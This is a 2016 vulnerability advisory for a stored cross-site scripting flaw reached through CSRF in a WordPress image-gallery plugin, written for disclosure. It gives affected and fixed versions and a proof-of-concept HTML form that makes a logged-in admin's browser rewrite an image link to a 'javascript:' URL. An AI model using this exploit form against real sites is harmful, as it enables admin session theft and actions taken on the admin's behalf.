------------------------------------------------------------------------
Stored Cross-Site Scripting in Gallery - Image Gallery WordPress Plugin
------------------------------------------------------------------------
Sipke Mellema, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A persistent Cross-Site Scripting vulnerability was found in the Gallery
- Image Gallery plugin. This issue allows an attacker to perform a wide
variety of actions, such as stealing Administrators' session tokens, or
performing arbitrary actions on their behalf. In order to exploit this
issue, the attacker has to lure/force a logged on WordPress
Administrator into opening a URL provided by an attacker.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0015

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on the Gallery - Image Gallery
WordPress Plugin version 1.9.65.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is resolved in Gallery - Image Gallery WordPress Plugin
version 2.0.6.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2016/stored_cross_site_scripting_in_gallery___image_gallery_wordpress_plugin.html

The issue exists because the Gallery image does not protect against CSRF attacks for the requests to edit gallery images. This makes it possible to change gallery image URLs to JavaScript schemas. The JavaScript will be saved. Every time a user clicks on the gallery image the JavaScript will run (Persistent Cross-Site Scripting).


Proof of Concept

Have an authenticated admin visit a webpage with the following form:

<html>
<body>
<form action="http://<wordpress site>/wp-admin/admin.php?page=gallerys_huge_it_gallery&id=2&task=apply&huge_it_nonce=b37a25b33d" method="POST">
<input type="hidden" name="changedvalues" value="11" />
<input type="hidden" name="name" value="New&#32;gallery" />
<input type="hidden" name="imagess" value="" />
<input type="hidden" name="order&#95;by&#95;11" value="1" />
<input type="hidden" name="imagess11" value="Foo" />
<input type="hidden" name="titleimage11" value="test" />
<input type="hidden" name="im&#95;description11" value="asd" />
<input type="hidden" name="sl&#95;url11" value="javascript&#58;alert&#40;1&#41;" />
<input type="hidden" name="sl&#95;link&#95;target11" value="" />
<input type="hidden" name="like&#95;11" value="9" />
<input type="hidden" name="dislike&#95;11" value="0" />
<input type="hidden" name="name" value="New&#32;gallery" />
<input type="hidden" name="huge&#95;it&#95;sl&#95;effects" value="5" />
<input type="hidden" name="sl&#95;width" value="600" />
<input type="hidden" name="sl&#95;height" value="1" />
<input type="hidden" name="gallery&#95;list&#95;effects&#95;s" value="cubeH" />
<input type="hidden" name="sl&#95;position" value="center" />
<input type="hidden" name="display&#95;type" value="2" />
<input type="hidden" name="content&#95;per&#95;page" value="5" />
<input type="hidden" name="autoslide" value="off" />
<input type="hidden" name="autoslide" value="on" />
<input type="hidden" name="pause&#95;on&#95;hover" value="off" />
<input type="hidden" name="pause&#95;on&#95;hover" value="on" />
<input type="hidden" name="sl&#95;pausetime" value="4000" />
<input type="hidden" name="sl&#95;changespeed" value="1000" />
<input type="hidden" name="rating" value="dislike" />
<input type="hidden" name="task" value="" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>

This will change the URL for the image (the image source) to javascript:alert(1). If a user clicks on the image name, the JavaScript will run.


------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.

